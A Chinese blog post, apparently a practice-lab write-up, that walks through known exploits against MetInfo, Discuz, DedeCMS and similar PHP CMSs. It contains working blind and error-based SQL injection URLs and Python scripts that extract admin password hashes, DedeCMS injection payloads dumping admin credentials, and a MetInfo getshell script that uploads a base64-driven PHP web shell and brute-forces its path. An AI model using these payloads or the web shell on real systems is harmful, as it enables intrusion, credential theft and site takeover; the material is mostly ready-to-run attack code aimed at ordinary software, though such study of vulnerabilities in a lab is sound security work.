<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="webug-实战"><meta name="keywords" content="Web"><meta name="author" content="littlefisher,undefined"><meta name="copyright" content="littlefisher"><title>webug-实战 | littlefisher</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.5.4"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  localSearch: undefined
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MENITFO"><span class="toc-number">1.</span> <span class="toc-text">MENITFO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#metino5-3"><span class="toc-number">1.1.</span> <span class="toc-text">metino5.3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#news-php盲注"><span class="toc-number">1.1.1.</span> <span class="toc-text">news.php盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#img-php盲注"><span class="toc-number">1.1.2.</span> <span class="toc-text">img.php盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metinfo5-1-7"><span class="toc-number">1.2.</span> <span class="toc-text">metinfo5.1.7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#任意文件包含漏洞getshell"><span class="toc-number">1.2.1.</span> <span class="toc-text">任意文件包含漏洞getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metinfo5-1以下"><span class="toc-number">1.3.</span> <span class="toc-text">metinfo5.1以下</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DZ"><span class="toc-number">2.</span> <span class="toc-text">DZ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DZ论坛"><span class="toc-number">2.1.</span> <span class="toc-text">DZ论坛</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DZ3-2"><span class="toc-number">2.2.</span> <span class="toc-text">DZ3.2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DEDECMS"><span class="toc-number">3.</span> <span class="toc-text">DEDECMS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flink-php友情链接"><span class="toc-number">3.1.</span> <span class="toc-text">flink.php友情链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#recommend-php"><span class="toc-number">3.2.</span> <span class="toc-text">recommend.php</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ECSHOP"><span class="toc-number">4.</span> <span class="toc-text">ECSHOP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#admin-shopinfo"><span class="toc-number">4.1.</span> <span class="toc-text">/admin/shopinfo</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BEESCMS"><span class="toc-number">5.</span> <span class="toc-text">BEESCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#admin"><span class="toc-number">5.1.</span> <span class="toc-text">/admin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHPMYADMIN"><span class="toc-number">6.</span> <span class="toc-text">PHPMYADMIN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#任意文件包含"><span class="toc-number">6.1.</span> <span class="toc-text">任意文件包含</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#海盗云商"><span class="toc-number">7.</span> <span class="toc-text">海盗云商</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP168-6-0"><span class="toc-number">8.</span> <span class="toc-text">PHP168 6.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpwind"><span class="toc-number">9.</span> <span class="toc-text">phpwind</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">littlefisher</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">13</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(http://119.29.91.207/mianma.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">littlefisher</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span></div><div id="post-info"><div id="post-title">webug-实战</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-14</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>实战部分主要是根据网上的一些漏洞辣，还有一些有问题没办法做的，我就不弄了。我是给分类了。还有很多不足之处，请多指教。<br><a id="more"></a></p>
<h1 id="MENITFO"><a href="#MENITFO" class="headerlink" title="MENITFO"></a>MENITFO</h1><h2 id="metino5-3"><a href="#metino5-3" class="headerlink" title="metino5.3"></a>metino5.3</h2><h3 id="news-php盲注"><a href="#news-php盲注" class="headerlink" title="news.php盲注"></a>news.php盲注</h3><p>漏洞详情：<br>根据原文中分析我们知道了，存在SQL注入的文件是<code>/include/global/listmod.php</code>, 存在注入的变量是<code>$serch_sql</code>。<br>在<code>listmod.php</code>文件200行的位置拼接了SQL语句，在拼接，SQL语句之前，对 <code>$serch_sql</code>变量进行了初始化操作，但是呢，控制它是否初始化的另一个变量为 <code>$imgproduct</code>。当这个<code>$imgproduct</code>变量非search的任意字符的时候，导致 <code>$serch_sql</code>不能进行初始化，从而可以自定义 <code>$serch_sql</code> 进行注入。</p>
<p>根据漏洞详情，直接访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/MetInfo/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=123qwe&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
<p>然后我们给 search_sql 的参数后加一个单引号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/MetInfo/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=123qwe&apos;&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
<p>返回有数据的页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serch_sql=123qwe where 4343=4343 -- x&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure></p>
<p>返回无数据的页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serch_sql=123qwe where 4343=4342 -- x&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL语句：</span><br><span class="line">SELECT * FROM met_news 123qwe where lang=&apos;cn&apos;  and (recycle=&apos;0&apos; or recycle=&apos;-1&apos;) and (( class1=&apos;2&apos;  and class2=&apos;5&apos; ) ) and displaytype=&apos;1&apos; and addtime&lt;=&apos;2015-12-29 17:59:20&apos;  order by top_ok desc,no_order desc,updatetime desc,id desc LIMIT 0, 8</span><br><span class="line">#注意：from 后面有met_news （只能用join）</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/Su5UFhd.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用了join：</span><br><span class="line">SELECT * FROM met_news as a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1 -- x</span><br><span class="line">&amp;imgproduct=xxxx</span><br><span class="line">输入网址为：</span><br><span class="line">news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1 -- x&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下面是自己实验的join的作用的实例：</span><br><span class="line">select a.id,a.username,b.password from uagents a join users b on a.username=b.username;</span><br><span class="line">select a.id,a.username,b.password from uagents as a join users as b on a.username=b.username;</span><br><span class="line">上面不同的是，有没有加as (这里实验过了，加不加都一样)</span><br></pre></td></tr></table></figure>
<p>python脚本跑一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import httplib</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">payloads = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;</span><br><span class="line">#url=&quot;http://localhost:8080/MetInfo_v5.3.0/&quot;</span><br><span class="line">password = &apos;&apos;</span><br><span class="line">for p in range(1, 33):</span><br><span class="line">    for num in payloads:</span><br><span class="line">        num = ord(num)</span><br><span class="line">        poc = &quot;http://172.30.129.74/pentest/cms/Metinfonew/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_pass,&quot;+str(p)+&quot;,1))=&quot;+str(num)+&quot;,1,0) limit 0,1-- sd&amp;imgproduct=xxxx&quot;</span><br><span class="line">        #print poc</span><br><span class="line">        #result = urllib.request.urlopen(poc).txt</span><br><span class="line">        conn = requests.get(poc)</span><br><span class="line">        res = conn.content</span><br><span class="line">        res = str(res)</span><br><span class="line">        if res.find(r&quot;为什么企业要建多国语言网站&quot;)&gt;0:</span><br><span class="line">            password = password + chr(num)</span><br><span class="line">            print password</span><br><span class="line">            break</span><br><span class="line">#结果：cc03e747a6afbbcbf8be7668acfebee5</span><br><span class="line">      （md5解密后：test123）</span><br></pre></td></tr></table></figure>
<p>下面使用工具跑一下，得到：</p>
<p><img src="https://i.imgur.com/7vrhlg5.png" alt=""></p>
<p>输入链接后，用密码登陆即可</p>
<h3 id="img-php盲注"><a href="#img-php盲注" class="headerlink" title="img.php盲注"></a>img.php盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://172.30.129.74/pentest/cms/merinfoimg/img/img.php?class1=1&amp;serch_sql=xxxxx</span><br><span class="line">[查询语句：select count(*) from met_img where xxxxx where lang=&apos;cn&apos; and(recycle=&apos;0&apos; or recycle=&apos;-1&apos;) and ((class=&apos;1&apos;))] and...</span><br><span class="line"></span><br><span class="line">http://172.30.129.74/pentest/cms/merinfoimg/img/img.php?class1=1&amp;serch_sql=（这里有个空格1=，是必须的）1=if(ascii(substr(user(),1,1))=114,1,2)%23</span><br><span class="line">（只能使用=114那的等号；只能使用%23）</span><br></pre></td></tr></table></figure>
<p>下面跑出来的是username:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line">import httplib</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">username = &apos;&apos;</span><br><span class="line">for num in range(1,20):</span><br><span class="line">    poc = &quot;http://172.30.129.74/pentest/cms/merinfoimg/img/img.php?class1=1&amp;serch_sql= 1=if(length(user())=&quot;+str(num)+&quot;,1,2)%23&quot;</span><br><span class="line">    print poc</span><br><span class="line">    conn = requests.get(poc)</span><br><span class="line">    res = conn.content</span><br><span class="line">    res = str(res)</span><br><span class="line">    if res.find(r&quot;下一页&quot;)&gt;0:</span><br><span class="line">        print num  #输出username几位</span><br><span class="line">        # password = password + chr(num)</span><br><span class="line">        # print password</span><br><span class="line">        break</span><br><span class="line">#14</span><br><span class="line"></span><br><span class="line">#下面就跑出来username</span><br><span class="line">payloads = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;</span><br><span class="line">for p in range(1, 15):</span><br><span class="line">    for num in payloads:</span><br><span class="line">        num = ord(num)</span><br><span class="line">        poc = &quot;http://172.30.129.74/pentest/cms/merinfoimg/img/img.php?class1=1&amp;serch_sql= 1=if(ascii(substr(user(),&quot;+str(p)+&quot;,1))=&quot;+str(num)+&quot;,1,2)%23&quot;</span><br><span class="line">        #print poc</span><br><span class="line">        #result = urllib.request.urlopen(poc).txt</span><br><span class="line">        conn = requests.get(poc)</span><br><span class="line">        res = conn.content</span><br><span class="line">        res = str(res)</span><br><span class="line">        if res.find(r&quot;下一页&quot;)&gt;0:</span><br><span class="line">            username = username + chr(num)</span><br><span class="line">            print username</span><br><span class="line">            break</span><br><span class="line">#rootlocalhost</span><br></pre></td></tr></table></figure>
<h2 id="metinfo5-1-7"><a href="#metinfo5-1-7" class="headerlink" title="metinfo5.1.7"></a>metinfo5.1.7</h2><h3 id="任意文件包含漏洞getshell"><a href="#任意文件包含漏洞getshell" class="headerlink" title="任意文件包含漏洞getshell"></a>任意文件包含漏洞getshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">漏洞详情：</span><br><span class="line">config/config.inc.php</span><br><span class="line">http://**.**.**.**//index.php?index=a&amp;skin=&amp;dataoptimize_html=/../../../favicon.ico</span><br><span class="line">参考前人的feedback/uploadfile_save.php可以上传图片文件</span><br><span class="line">这里还有其他问题查看下面的链接吧：</span><br><span class="line">http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell%E4%B8%80%E9%94%AE%E5%8C%96%E5%B7%A5%E5%85%B7.html</span><br></pre></td></tr></table></figure>
<p>下面直接给出步骤：<br>上面链接中也给出了python代码：（大牛直接制作成工具，下面将使用工具）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding: utf-8 -*-</span><br><span class="line">import requests #是一常用的http请求库,可以方便地发送http请求，以及方便地处理响应结果。</span><br><span class="line">import Queue #线程安全的队列（先进先出）。</span><br><span class="line">import threading #提供对线程的支持。</span><br><span class="line">import time #返回当前时间的时间戳（1970纪元后经过的浮点秒数）。</span><br><span class="line">import sys #</span><br><span class="line">headers = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36&apos;&#125;</span><br><span class="line">urls = Queue.Queue() #创建一个队列对象</span><br><span class="line">#http://hb.jhxjd.com/upload/file/1441445378.php</span><br><span class="line">def bp(urls,time_out):</span><br><span class="line">    while not urls.empty():</span><br><span class="line">        base_url = urls.get()</span><br><span class="line">        response = None</span><br><span class="line">        try:</span><br><span class="line">            time.sleep(int(time_out))#延时设置</span><br><span class="line">            response = requests.get(base_url,headers=headers)</span><br><span class="line">            if response.status_code == 404:</span><br><span class="line">                print &apos;Not Fount----%s\n&apos; % base_url</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">        finally:</span><br><span class="line">            if response:</span><br><span class="line">                with open(&apos;url.txt&apos;,&apos;a+&apos;) as f:</span><br><span class="line">                    f.write(&apos;%s?e=YXNzZXJ0\n&apos;%base_url)</span><br><span class="line">def main(target_url,thread_num,time_out):</span><br><span class="line">    #取出当前时间戳并删除后四位</span><br><span class="line">    now = str(int(time.time()))[:-4]</span><br><span class="line">    #将所有的待爆破地址遍历并加入队列</span><br><span class="line">    for i in range(0,10):</span><br><span class="line">        for j in range(100,1000):</span><br><span class="line">            num_str = &apos;&apos;.join((str(i),str(j)))</span><br><span class="line">            url = &apos;&apos;.join((&apos;%s/upload/file/%s&apos; % (target_url,now),num_str,&apos;.php&apos;))</span><br><span class="line">            urls.put(url)</span><br><span class="line">    #上传文件</span><br><span class="line">    with open(&apos;xiaoma.php&apos;,&apos;w+&apos;) as fi:</span><br><span class="line">        fi.write(&quot;&lt;?php $e = $_REQUEST[&apos;e&apos;];register_shutdown_function(base64_decode($e), $_REQUEST[&apos;Akkuman&apos;]);?&gt;&quot;)</span><br><span class="line">    data = &#123;</span><br><span class="line">            &apos;fd_para[1][para]&apos;:&apos;filea&apos;,</span><br><span class="line">            &apos;fd_para[1][type]&apos;:&apos;5&apos;</span><br><span class="line">            &#125;</span><br><span class="line">    files = &#123;&apos;filea&apos;: open(&quot;xiaoma.php&quot;, &apos;rb&apos;)&#125;</span><br><span class="line">    upload_url = &apos;%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo&apos; % target_url</span><br><span class="line">    res = requests.post(upload_url,data = data,files=files)</span><br><span class="line">    #等待两秒  文件上传</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    #启动多线程</span><br><span class="line">    for i in range(int(thread_num)):</span><br><span class="line">        t = threading.Thread(target = bp,args=(urls,time_out,))</span><br><span class="line">        t.start()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(sys.argv) != 4:    #实现从程序外部向程序传递参数</span><br><span class="line">        print &apos;Example : %s http://www.xxx.com 20 0&apos; % sys.argv[0]</span><br><span class="line">    else:</span><br><span class="line">        main(sys.argv[1],sys.argv[2],sys.argv[3])</span><br></pre></td></tr></table></figure>
<p>基于上面python的exe的使用:</p>
<p><img src="https://i.imgur.com/cor52e9.png" alt=""><br><img src="https://i.imgur.com/PV9GPL3.png" alt=""></p>
<p>然后用菜刀就可进去了。</p>
<h2 id="metinfo5-1以下"><a href="#metinfo5-1以下" class="headerlink" title="metinfo5.1以下"></a>metinfo5.1以下</h2><p>先注册个会员,然后登陆进去</p>
<p>进行修改基本信息操作，同时抓包：</p>
<p><img src="https://i.imgur.com/xBETtwn.png" alt=""><br><img src="https://i.imgur.com/bWhk6gK.png" alt=""></p>
<p>useid修改成admin之后会提示操作成功</p>
<p><img src="https://i.imgur.com/OOBtMsH.png" alt=""></p>
<p>在浏览器中输入地址：</p>
<p><img src="https://i.imgur.com/YvwWNQK.png" alt=""></p>
<h1 id="DZ"><a href="#DZ" class="headerlink" title="DZ"></a>DZ</h1><h2 id="DZ论坛"><a href="#DZ论坛" class="headerlink" title="DZ论坛"></a>DZ论坛</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) </span><br><span class="line">and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x </span><br><span class="line">from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/DQiQdS8.png" alt=""></p>
<p>继续查表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/6ZwioFC.png" alt=""></p>
<h2 id="DZ3-2"><a href="#DZ3-2" class="headerlink" title="DZ3.2"></a>DZ3.2</h2><p>这里编译软件，一写会有弹框。。。。就很简单的弹框哈，看图即可~<br><img src="https://i.imgur.com/2xhLGf4.png" alt=""></p>
<h1 id="DEDECMS"><a href="#DEDECMS" class="headerlink" title="DEDECMS"></a>DEDECMS</h1><h2 id="flink-php友情链接"><a href="#flink-php友情链接" class="headerlink" title="flink.php友情链接"></a>flink.php友情链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">问题在下面的链接——申请链接：</span><br><span class="line">http://172.30.129.74/pentest/cms/dedecms/plus/flink_add.php</span><br><span class="line">这里面php配置文件中有gpc</span><br></pre></td></tr></table></figure>
<p>抓包改包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Submit=%20%E6%8F%90%20%E4%BA%A4%20&amp;dopost=save&amp;email=</span><br><span class="line">&amp;logo=,if(@`&apos;`,0x7c,(select concat(userid,0x7c,pwd) from dede_admin limit0,1)),1,1,1,1,1)#,@`&apos;` #修改处</span><br><span class="line">&amp;typeid=1&amp;url=http%3A%2F%2F&amp;validate=spen</span><br><span class="line"></span><br><span class="line">&amp;_FILES[webname][name]=1.gif&amp;_FILES[webname][type]=image/gifx&amp;_FILES[webname][size]=10&amp;&amp;_FILES[webname][tmp_name]=pass\ #添加处</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/p3oAZeQ.png" alt=""><br><img src="https://i.imgur.com/COhtie6.png" alt=""></p>
<p>结果展示：（下面是我两次测试的结果）</p>
<p><img src="https://i.imgur.com/2QwV2CN.png" alt=""><br><img src="https://i.imgur.com/WI7GtHa.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;_FILES[webname][name]=1.gif&amp;_FILES[webname][type]=image/gifx&amp;_FILES[webname][size]=10&amp;&amp;_FILES[webname][tmp_name]=pass\logo=,if(@`&apos;`,0x7c,(select version())),1,1,1,1,1)#,@`&apos;`</span><br><span class="line">下面为输入正常时的测试的语句：</span><br><span class="line">INSERT INTO `#@__flink`(sortrank,url,webname,logo,msg,email,typeid,dtime,ischeck) VALUES(&apos;50&apos;,&apos;http://12&apos;,&apos;12&apos;,&apos;12&apos;,&apos;12&apos;,&apos;12&apos;,&apos;1&apos;,&apos;1525784361&apos;,&apos;0&apos;)</span><br><span class="line">注入时的语句：</span><br><span class="line">INSERT INTO `#@__flink`(sortrank,url,webname,logo,msg,email,typeid,dtime,ischeck) VALUES(&apos;50&apos;,&apos;http://&apos;,&apos;pass\&apos;,&apos;,if(@`\&apos;`,0x7c,(select concat(userid,0x7c,pwd) from dede_admin limit 0,1)),1,1,1,1,1)#,@`\&apos;`&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;1525784436&apos;,&apos;0&apos;)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/C1QRxNB.png" alt=""></p>
<h2 id="recommend-php"><a href="#recommend-php" class="headerlink" title="recommend.php"></a>recommend.php</h2><p>先补充个知识：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo str_replace(&quot;world&quot;,&quot;Shanghai&quot;,&quot;Hello world!&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">结果：Hello Shanghai!</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedecms5.7/plus/recommend.php?&amp;aid=1</span><br><span class="line">&amp;_FILES[type][tmp_name]=\%27%20%20or%20mid=@%60\%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20%20CONCAT%280x7c,userid,0x7c,pwd%29+from+%60%23@__admin%60%20limit+0,1%29,5,6,7,8,9%23@%60\%27%60+&amp;_FILES[type][name]=1.jpg</span><br><span class="line">&amp;_FILES[type][type]=application/octet-stream</span><br><span class="line">&amp;_FILES[type][size]=111</span><br><span class="line">#/*!50000union*/  表示若mysql版本高于5.0.0，则执行union操作.</span><br><span class="line">（这里去掉+也是对的）</span><br><span class="line">下面是解码出来的，直接使用是不正确的：</span><br><span class="line">http://172.30.129.74/pentest/cms/dedecms1/plus/recommend.php?&amp;aid=1</span><br><span class="line">&amp;_FILES[type][tmp_name]=\&apos; or mid=@`\&apos;` /*!50000union*//*!50000select*/1,2,3,(select  CONCAT(0x7c,userid,0x7c,pwd)from `#@__admin` limit 0,1),5,6,7,8,9#@`\&apos;` </span><br><span class="line">&amp;_FILES[type][name]=1.jpg</span><br><span class="line">&amp;_FILES[type][type]=application/octet-stream</span><br><span class="line">&amp;_FILES[type][size]=111</span><br><span class="line">注入成功后相当于下面的语句:</span><br><span class="line">mysql&gt; SELECT s.*,t.* FROM   </span><br><span class="line">    -&gt; `dede_member_stow` AS s LEFT JOIN   </span><br><span class="line">    -&gt; `dede_member_stowtype` AS t ON s.type=t.stowname   </span><br><span class="line">    -&gt; WHERE s.aid=&apos;1&apos;   </span><br><span class="line">    -&gt; AND s.type=&apos;\\&apos; or mid=@`\\&apos;` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `dede_admin` limit 0,1),5,6,7,8,9#@`\\&apos;` &apos;;  </span><br><span class="line">    -&gt; ;</span><br></pre></td></tr></table></figure>
<p>里面那个python没法用了，我给个链接，大牛们自己来弄下，告诉本小白吧~</p>
<p><a href="https://blog.csdn.net/nixawk/article/details/24982851" target="_blank" rel="noopener">https://blog.csdn.net/nixawk/article/details/24982851</a></p>
